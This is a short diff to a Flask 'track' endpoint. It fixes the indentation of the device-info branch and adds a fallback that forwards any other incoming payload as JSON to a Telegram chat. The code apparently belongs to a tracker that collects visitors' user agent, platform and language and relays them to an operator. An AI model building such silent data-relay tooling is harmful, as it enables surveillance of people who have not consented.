@@ -184,7 +184,7 @@ def track():
         return jsonify({"ok": True}), 200
 
     # ── DEVICE INFO ──
-        if typ == "device_info" and isinstance(payload, dict):
+    if typ == "device_info" and isinstance(payload, dict):
         ua = payload.get("ua", "n/a")
         platform = payload.get("platform", "n/a")
         lang = payload.get("lang", "n/a")
@@ -245,6 +245,17 @@ def track():
         )
         _send_telegram_text(uid, text)
         return jsonify({"ok": True}), 200
+
+    # ── FALLBACK ──
+    text = (
+        f"📡 <b>{typ}</b>\n"
+        f"{DIVIDER}\n"
+        f"<code>{json.dumps(payload)[:900]}</code>\n"
+        f"{DIVIDER}\n"
+        f"{FOOTER}"
+    )
+    _send_telegram_text(uid, text)
+    return jsonify({"ok": True}), 200
 
 @app.route("/health", methods=["GET"])
 def health():
